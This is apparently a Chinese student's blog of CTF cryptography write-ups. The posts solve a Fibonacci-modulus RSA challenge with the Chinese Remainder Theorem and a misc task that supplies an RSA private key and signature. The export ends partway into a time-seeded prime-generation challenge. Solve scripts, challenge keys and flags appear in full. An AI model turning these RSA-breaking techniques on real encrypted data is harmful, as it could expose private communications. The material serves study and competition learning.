<h4 id="我要这题何用"><a href="#我要这题何用" class="headerlink" title="我要这题何用"></a>我要这题何用</h4><img alt="20210529 DASCTFXBUUOJ五月大联动-f4679c38.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-f4679c38.png" width="" height="" >

<p>经过验证，这三个数根本不是斐波那契数，屑，出题人使诈</p>
<p>……</p>
<p>拖拖拖，拖到比赛结束又过去了一个白天，半夜看到别人队伍的wp了，师傅们TQL___Orz，都给A穿了</p>
<p>但其实我们已经出来了，害，<strong>意识</strong>不够，看到给了三组没有想到什么</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-083610fe.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-083610fe.png" width="" height="" >

<p>简单的推理如下，</p>
<p>已知（注意这里的$F(q_i)并不是完全分解$）<br>$$<br>\begin{cases}<br>  c_1=\ m^e\ mod\ (F(p_1)\times F(q_1))\\<br>  c_2=\ m^e\ mod\ (F(p_2)\times F(q_2))\\<br>  c_3=\ m^e\ mod\ (F(p_3)\times F(q_3))<br>\end{cases}<br>$$<br>由同余的性质可知，在模$F(p_i)$的情况下也是成立的（吼吼吼，这可是对一个密码学菜鸡（wǒ）很重要的数论性质，在文末强调一下吧，<a href="#%E4%B8%80%E4%B8%AA%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E6%80%A7%E8%B4%A8%E4%BB%A5%E5%8F%8A%E7%AE%80%E6%98%93%E8%AF%81%E6%98%8E">传送门</a>）<br>$$<br>\begin{cases}<br>  c_1=\ m^e\ mod\ F(p_1)\\<br>  c_2=\ m^e\ mod\ F(p_2)\\<br>  c_3=\ m^e\ mod\ F(p_3)<br>\end{cases}<br>$$<br>这时的解密就是，为了避免混淆，我这里完全分成三个加密了，它们都是类似的，举第一个为例<br>$$<br>m_1=\ c_1^{d_1}\ mod\ F(p_1)<br>$$<br>而$m_1$都满足<br>$$<br>m\equiv\ m_1\ mod\ F(p_1)<br>$$<br>但是因为$m_1$求出来太小啦（毕竟是在模$F(p_1)$下，原来可是在模$F(p_1)\times F(q_1)$下的），如果m比任意的$F(p_i)$都大，那么求出来的$m_i$都只不过是m在模各自$F(p_i)$的一个剩余类罢了，这样解出来的$m_i$就是不对的</p>
<p>那应该怎么办呢？</p>
<h4 id="中国剩余定理yyds"><a href="#中国剩余定理yyds" class="headerlink" title="中国剩余定理yyds"></a>中国剩余定理yyds</h4><p>这就要引入中国剩余定理CRT这个概念了，它的原本是用来解同余方程的，但是求出来的解是在模所有模数之积的情况下的，所以假设所有模数之积为N，只要明文m是在$\mathbb{Z_N}$中的，就可以做到——完全求解；但是如果不成立只能求出一个与m在模N同余的剩余类，并不是真的解</p>
<p>这就是我们的思路，因为我们手头上就只有三组解，可能将模数给扩大到$F(p_1)\times F(p_2)\times F(p_3)$，如果凑巧，m比这个乘积要小，就能求出来了，如果还不行，说明题目给的m比较大，也就是flag比较长，只能继续分解$F(N_i)$，构造更多同余方程，直到模数之积大于flag转变成的m</p>
<p>也就是用这个<br>$$<br>\begin{cases}<br>m_1=\ c_1^{d_1}\ mod\ F(p_1)\\<br>m_2=\ c_2^{d_2}\ mod\ F(p_2)\\<br>m_3=\ c_3^{d_3}\ mod\ F(p_3)<br>\end{cases}<br>$$<br>推导出的<br>$$<br>\begin{cases}<br>m\equiv\ m_1\ mod\ F(p_1)\\<br>m\equiv\ m_2\ mod\ F(p_2)\\<br>m\equiv\ m_3\ mod\ F(p_3)<br>\end{cases}<br>$$<br>解同余方程，看看出来的是不是flag</p>
<p>醒悟之后下来含泪的脚本，包括抄来的求fibonacci数列的和中国剩余定理的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    t = <span class="built_in">int</span>(math.log2(n)) - <span class="number">1</span></span><br><span class="line">    x, y, = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> t &gt; <span class="number">0</span>:</span><br><span class="line">        last_x = x</span><br><span class="line">        <span class="keyword">if</span> (n &gt;&gt; t) &amp; <span class="number">0x1</span>:</span><br><span class="line">            x = x**<span class="number">2</span> + (x + y)**<span class="number">2</span></span><br><span class="line">            y = last_x * (last_x + <span class="number">2</span> * y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = x * (x + <span class="number">2</span> * y)</span><br><span class="line">            y = last_x**<span class="number">2</span> + y**<span class="number">2</span></span><br><span class="line">        t -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">        <span class="keyword">return</span> x**<span class="number">2</span> + (x + y)**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x * (x + <span class="number">2</span> * y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crt</span>(<span class="params">ci, ni</span>):</span></span><br><span class="line">    <span class="comment"># 检查是否有解，有解的条件，ni都互质</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ni)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(ni)):</span><br><span class="line">            <span class="keyword">assert</span> gcd(ni[i], ni[j]) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ci) == <span class="built_in">len</span>(ni)</span><br><span class="line"></span><br><span class="line">    _N = reduce(<span class="keyword">lambda</span> a, b: a*b, ni)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(ci, ni):</span><br><span class="line">        _Ni = _N//j</span><br><span class="line">        _Ni1 = invert(_Ni, j)</span><br><span class="line">        x += i*_Ni*_Ni1</span><br><span class="line">    <span class="keyword">return</span> x % _N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">30039002188673063651200304724856649750424855614713561659816258454033925531379709006718595334296516241593158998074215212142272196270365664747873959581114872378007750905526355257967620809790424857457592189785708634246739647422565451143815984036502331156971328504879840492056807034649796388685443055568787638373563</span></span><br><span class="line">F1 = <span class="number">36700337315478358423302463804643502364132894595387679831392170242048570294154137205916046749632259595443511772051005890145681246611711817441148722686433058905309178967626876196428817911402628279151882749816176290631663850711266005570519120688501046610172118214633159846090742563888545000820131558915392759986137704413717356161549696109102298045171982651759736931461029700093546074544216714411268154766313965335118439291477901688458760307733751977411099481922798986947005456033024215394531788003343093192780270571980899284495530589488614458267489897774350955741276841747926401364869628844871476483816139224540693572750083532852690939679488779770278121521966166639184387859708670915429469804929002101080867694318638835470062005769336931710061708165085286293560882862673863182161513175108975599928164057840378446866053785509135134250439675861761412916432659950998041079347609299108756058982586701419597870024243472621875398244582253182771532237956030075796524234449649579003219049</span></span><br><span class="line">c1 = <span class="number">5149579488901718498256373861975221458889060262051324713153792274531569740959338672159468511041469512968513162060650323314015111729630790249929764405001469068728832250672432536655958494683225528045534739312500520653653926107616626321646038503307002215682827882897681738805565989931916973526625237494508575698650414426281874530049741540818321302625573676530536769431267223818807952634410781018835593002628264062168865877875709419051886274533984009771861504132373726000546543208681246415153517353772565209140561174813777886487077708362479762600413004602240042298109893816953817393105259401510845057279294044756541864350957113952935658077279981571022227194710269040317178329523984989277421087981594122731035549685470894608888049815174440061043045638797036874542111575347820490125255592416295645107767029867230219384632544284156692872055786752135888144873738488840255388898851551453544530082551649823629868841430161794325580654855230486824210856918330348898081161664747016870749921</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20756277616755836861796337131683494338352701206928094011019872107808330954223862907177555525893261715593610455375647872190101833907080699823790147515155417500649420182409578349022597139001229776650770207829659368291648098353474620323733162983388953788239424626462428488411835382477744747369092196172727799468129</span></span><br><span class="line">F2 = <span class="number">73745878045934636387896195274069826551569516766963182339313590908194755029865664679120132471843611642027469204171633501721641080925317635658799561477123939207311526297390646712571316606381873782191178958234889168599083479590822672109275622907151415552207811665808203751267410151224170154736841450903230193274146578562848780223022725054392389915985290416059522271191922854734627854849084277940339695243325424932830011581455271309868481867791848671985869262214017536640985196012788793460756899871516178490553441223897250090614367273308559864669269965578509523152119870676641602044879271520652270508502838994825168113044092631541016378753797168654004397854528716878554680966919397339024634461107466963998140873416841269245629405227723896214356538994142798927935847118081299628628813983021407779086407107873835131175157418129203731497042769363491200520978441329400751265966093987214492433690588592278950077342020700742819163199408329926294779182691364743193734488228719</span></span><br><span class="line">c2 = <span class="number">5893676968379648852677257584942191109596695953257511502221493623707657958793151928063695511404323761502093871747314475680963368412056002167272056988434183588136518540030328900237814175026374170035752147457944130025788557913749495512316872731640598728203711834687604349623497761823630666336599012384701148134898626277451946739191645056229526840490101366707716010899628734677395956010814780086058428182227433879240458756480238286363782312887091585752283137070930652073681891561066188131229432708558323016170835880200185835314330898745048592325798107333894598294876001536344275083054913481975007098183772410065580414486344966276992142840553960291265334551415769700709112077959058690472699228393932778693676888105307493544864165340738016954896582284163878309410561472175085522432252484026380738098291004277354471010420592137620174716251226560188793137038378169674648650109100511358090004029326014324282641470675210622193652390362972072927753788251933923336522541020538</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">23691611795512881548876576490920777356012500842496810447368465555253207159934330531730113872431842020621324344446142448954349963332039143377219840904377051014940314330764948944111930704132580375788932310940376348012980840541573284360163056070088226098587825855247120630453584914813593602869923553994121677913829</span></span><br><span class="line">F3 = <span class="number">9354120234373821188002721174172376187851074553842250946994966454521076364770447254561289329644492544492363073660918209867635665556179493971516453831575577085229601305613934033279832212516762995062790158649731235328923025944567754094837437882988453755837757140503680845082446605924488438186342529892438539978025244619294478667640323307281530468578326413724432442367286795555698768396763148070646067431485983937912884160277380848384622618517411849896779104223556934427313741222400162647303864273804545658096365574243669367638797710979775090679277794669009497301787205587916669811596486681600927221914751277959719025890975947906807551671033707046998050580404291266129815613731776357171701993365320613177014644670728884401252046842886254766791009584832861321307145962353061550438485818190867215102212015602783104130507243211654301408379888922865198634687009616395466846020452426608653076648665616711357303753242673389482755201639605067581161306428053985480749</span></span><br><span class="line">c3 = <span class="number">5527295227051355798054266434992298352109856653351231751774366060474987674395801103779017995136358984850596693033786379284945829600181195650018576473832122123689374306357799469703873467631828582340852591088516097040696492555053370228278729688979599727840615379716837557947979105109295383721874687464666950312431293310758869315198932080703658526964530199675712576963592684818247111162090363056774275409164410925950049724140156220797817319956734605599349828169364123443161210061751433895202659075589086208524908238147473041649043519688635549021052796213275288198028578858764052136199721656697612607002863436475864686744976361468007786764828741313027638038039869019572535344397813504142312113571484580538973034322648843004665888312135523153988203801290669186909018156540165112741651436700837185946879899717245458101182522362705139925914797396797181901663790903646171709744845258954151859189108531243389446981087547490853432279034430995853488274409450850672046</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="number">251</span></span><br><span class="line">q1 = <span class="number">119677299556466389048606791732496612551493448664197456812016965952326396539361390465014324041021977058140075689538706024471203969204644082660852428610019411864572712771021335689114027130639142858396781632612384996998962738735320522485322645563754307398292145437768288812975326831274089197949972332943377045313</span></span><br><span class="line">p2 = <span class="number">197</span></span><br><span class="line">q2 = <span class="number">105361815313481405389829122495855301209912188867655299548324223897504218041745496990749012821793206678140154595815471432437065146736450252912640342716524961932230559301571463700622320502544313587059747247866291209602274610931343250374280015144106364407306723992195068469095611078567232220147676122704202027757</span></span><br><span class="line">p3 = <span class="number">149</span></span><br><span class="line">q3 = <span class="number">159004106010153567442124674435709915141023495587226915754150775538612128590163292159262509210951959869941774123799613751371476263973417069645770744324678194731143049199764758014174031571359599837509612825103196966530072755312572378256127893087840443614683395001658527721164999428279151697113580899289407234321</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p1*q1 == n1</span><br><span class="line"><span class="keyword">assert</span> p2*q2 == n2</span><br><span class="line"><span class="keyword">assert</span> p3*q3 == n3</span><br><span class="line"></span><br><span class="line">p = [fibonacci_2(p1), fibonacci_2(p2), fibonacci_2(p3)]</span><br><span class="line">f = [F1, F2, F3]</span><br><span class="line"></span><br><span class="line">p11 = <span class="number">582416774750273</span></span><br><span class="line">q11 = <span class="number">21937080329465122026187124199656961913</span></span><br><span class="line"></span><br><span class="line">p22 = <span class="number">15761</span></span><br><span class="line">q22 = <span class="number">25795969</span></span><br><span class="line">r22 = <span class="number">227150265697</span></span><br><span class="line">s22 = <span class="number">717185107125886549</span></span><br><span class="line"></span><br><span class="line">p33 = <span class="number">110557</span></span><br><span class="line">q33 = <span class="number">162709</span></span><br><span class="line">r33 = <span class="number">4000949</span></span><br><span class="line">s33 = <span class="number">85607646594577</span></span><br><span class="line"></span><br><span class="line">phi1 = (p11-<span class="number">1</span>)*(q11-<span class="number">1</span>)</span><br><span class="line">phi2 = (p22-<span class="number">1</span>)*(q22-<span class="number">1</span>)*(r22-<span class="number">1</span>)*(s22-<span class="number">1</span>)</span><br><span class="line">phi3 = (p33-<span class="number">1</span>)*(q33-<span class="number">1</span>)*(r33-<span class="number">1</span>)*(s33-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = invert(e, phi1)</span><br><span class="line">d2 = invert(e, phi2)</span><br><span class="line">d3 = invert(e, phi3)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, d1, p[<span class="number">0</span>])</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, p[<span class="number">1</span>])</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3, d3, p[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt([m1, m2, m3], p)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;40491b82090cc75e56ce5196dc1b91e8&#125;</span><br></pre></td></tr></table></figure>

<p>顺便也学到了，库函数里有直接求欧拉函数的，好耶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 现成的欧拉函数</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = …</span><br><span class="line">phi = euler_phi(n)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><a href="https://zhuanlan.zhihu.com/p/376338394">贴上大佬的链接</a></p>
<p>可恶啊，差一点，托论文的福气，我们知道了那个斐波那契数列的性质，但是还是意识太差了，中国剩余定理解同余方程啊</p>
<p>好题，确实没毛病，要怪只怪我太抠细节了吧</p>
<h3 id="一个很重要的性质以及简易证明"><a href="#一个很重要的性质以及简易证明" class="headerlink" title="一个很重要的性质以及简易证明"></a>一个很重要的性质以及简易证明</h3><p>这条性质如下<br>$$<br>a\equiv b\ (mod\ m),a\equiv b\ (mod\ n)\Leftrightarrow\ a\equiv b\ (mod\ mn)<br>$$<br>前提是$(m, n)=1$，也就是m和n互素</p>
<p>证明：<br>$$<br>\because a\equiv b\ (mod\ m),\ a\equiv b\ (mod\ n)<br>$$</p>
<p>$$<br>\therefore m|(a-b)且n|(a-b)<br>$$</p>
<p>由FTA（算数基本定理）可知，m可以唯一分解成<br>$$<br>m=m_1\times m_2\times\ …\times m_i\<br>$$<br>同理，<br>$$<br>n=n_1\times n_2\times\ …\times n_i<br>$$</p>
<p>而且$(m,n)=1$，也就是说集合${m_1,\ m_2,\ …,\ m_i}$和集合${n_1,\ n_2,\ …,\ n_i}$中的元素，两两不相同<br>$$<br>\therefore mn|(a-b)即a\equiv b\ (mod\ mn)<br>$$</p>
<p>这里还用到了同余关系的等价表达式，望周之</p>
<h3 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h3><p>在彻底弄懂这道题时，我发现其实不需要三组，两组也行，不过必须是$F(p_i)$想乘大于m的情况，因为中国剩余定理的一种用法，我的理解是扩大模数，只能求出$m\ mod\ F(p_1)F(p_2)F(p_3)$是吧，但如果m本身就比$F(p_1)F(p_2)$小，当然可以只用CRT求解前面两个组成的同余方程；这就和模数不够再分解构造反过来了</p>
<p>据结果返回，我们发现，</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-e580ce12.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-e580ce12.png" width="" height="" >

<p>直接开冲</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-cce1f4d0.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-cce1f4d0.png" width="" height="" >

<p>Capture The Flag</p>
<h2 id="还有一个小插曲"><a href="#还有一个小插曲" class="headerlink" title="还有一个小插曲"></a>还有一个小插曲</h2><p>彭总给的一道misc，最后一步是rsa</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI</span><br><span class="line">A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H</span><br><span class="line">DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td</span><br><span class="line">INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly</span><br><span class="line">AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7</span><br><span class="line">v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f</span><br><span class="line">Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5</span><br><span class="line">ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2</span><br><span class="line">YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J</span><br><span class="line">Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU</span><br><span class="line">Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje</span><br><span class="line">0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R</span><br><span class="line">pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk</span><br><span class="line">AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg</span><br><span class="line">OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc</span><br><span class="line">QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL</span><br><span class="line">uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ</span><br><span class="line">9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK</span><br><span class="line">kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa</span><br><span class="line">yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG</span><br><span class="line">7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh</span><br><span class="line">ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7</span><br><span class="line">efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK</span><br><span class="line">OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI</span><br><span class="line">F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai</span><br><span class="line">nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1</span><br><span class="line">mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT</span><br><span class="line">DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h</span><br><span class="line">Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb</span><br><span class="line">hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI</span><br><span class="line">pQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;data&gt;</span><br><span class="line">6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569</span><br><span class="line">&lt;sign&gt;</span><br><span class="line">2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806</span><br></pre></td></tr></table></figure>

<p>这个网站可以对这个文件的格式进行解析（虽然觉得用openssl更有逼格一点，但是搜了许多感觉有点怪，在线的不香吗）<br><a href="https://www.ssleye.com/priv_get.html">https://www.ssleye.com/priv_get.html</a></p>
<p>解析出来是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">19298383934402303776125763032487034395837290787269136241860929371666322803767005809256376467251747337544207987651243732876788723589391443122139006291670739679671881793995062117862054219773720641070620393257280059636631655606299095240092759065646066472874883103079707806412908225076882298697592818427957280248310545565886424283345305315588905456274845835539850117078894827271423187201674309901517200507605514506810554986443591457553871395991374493663775609810305552059745143075621932565847065010052223136631616841830344641425039696588885154977303322142305642341212151656150304867047412766712682132001889777020524791973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">3137235186797109181543919913150081090883783146124561354971792140710331616511797608859383781407450999194287072957815443643580070206469268276290781894677206166703148277053014202720636062948704086393432559771778716684753248681348101998686974611065401104750125952976352395891223648167738895743231363772089916593108326960368256904683762740112717950191378373879647606045501882017215733660352686694405659463412799487222511524326086693134712754258387193963090680988416969472940644308784344753494344590799813350562816191244386991480741139476116903925249873160845868063446516486452687657008647635622012862948358441702637219329</span></span><br><span class="line">p = <span class="number">139731890355244444444481193351254240382046157745753107784168081259905132570466329632284952677745944718796408024129423905064872080575084258263419439079106234950631002219878620094334031716695105950708580750238041143435139361782342237330225211801270672585910851695391826655791509425136418067722676156822188664897</span></span><br><span class="line">q = <span class="number">138110089868099985112598225976416346201381948401336998275010504058986842232246648573037043751233266052881639193423727942204630085471488139402695765255520423890781964577838337616082316055958265340997629227918247719815192989410797326080614722191761865261768884814085886604594016717232369095342986175683061540709</span></span><br></pre></td></tr></table></figure>

<p>然后猜测data就是密文，然后常规解密只出来一半，另一半应该是与sign有关</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-faa58622.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-faa58622.png" width="" height="" >

<p>看了套神的博客</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-b88cacaf.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-b88cacaf.png" width="" height="" >

<p><strong>公钥认证，私钥加密</strong>，这句话很重要</p>
<p>虽然数字签名还没有上到，但思路也是一种加密手段，用来证明这是某人发送的消息，所以对其进行解密，也能获取某种东西从而进行验证，现在只会网上的一些工具，rsa的签名过程后续会补上</p>
<p>巧了，第二天就上到了，你说妙不妙，用理论知识武装头脑.jpg</p>
<p>没想到很简单，所谓用公钥签名就是：$用d给m加密即，m这里指的是像现实中合同一样的信息$</p>
<p>用代数符号也就是<br>$$<br>sign=m^d\ mod\ n<br>$$<br>那么解密也就很简单啦<br>$$<br>m=sign^e\ mod\ n<br>$$<br>代码实现想必不需要赘述了吧</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-d388a46f.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-d388a46f.png" width="" height="" >

<p>你说气不气，就差亿点点点就可以助攻彭总了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>斐波那契数列和RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 春秋杯网络安全联赛春季赛Crypto方向部分WP</title>
    <url>/posts/250213ee/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="2021年春秋杯网络安全联赛春季赛"><a href="#2021年春秋杯网络安全联赛春季赛" class="headerlink" title="2021年春秋杯网络安全联赛春季赛"></a>2021年春秋杯网络安全联赛春季赛</h1><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>只有代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gmpy2.is_prime(x) == <span class="literal">False</span>:</span><br><span class="line">        random.seed(<span class="built_in">round</span>(time.time(),<span class="number">5</span>))</span><br><span class="line">        x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">hint = <span class="string">&quot;&quot;</span></span><br><span class="line">a1 = time.time()</span><br><span class="line">flag = <span class="string">&quot;flag&#123;***************&#125;&quot;</span></span><br><span class="line">p = get_prime(<span class="number">2048</span>)</span><br><span class="line">q = get_prime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span> n &gt; m</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">hint+=<span class="built_in">str</span>(time.localtime())</span><br><span class="line">hint+=<span class="built_in">str</span>(time.time()-a1)   <span class="comment"># 告诉我们上面这段程序运行的时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(hint.encode())</span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = gmpy2.next_prime(p2)</span><br><span class="line">n2 = p2*q2</span><br><span class="line"><span class="keyword">assert</span> n2 &gt; m2</span><br><span class="line">c2 